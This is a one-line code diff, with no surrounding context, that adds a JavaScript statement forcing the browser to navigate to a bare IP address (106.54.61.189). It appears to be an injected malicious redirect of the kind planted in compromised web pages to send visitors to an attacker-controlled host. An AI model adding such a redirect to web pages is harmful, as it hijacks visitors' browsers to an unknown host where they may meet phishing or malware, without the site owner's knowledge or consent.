@@ -1,0 +1,1 @@
+window.location.href="http://106.54.61.189/"
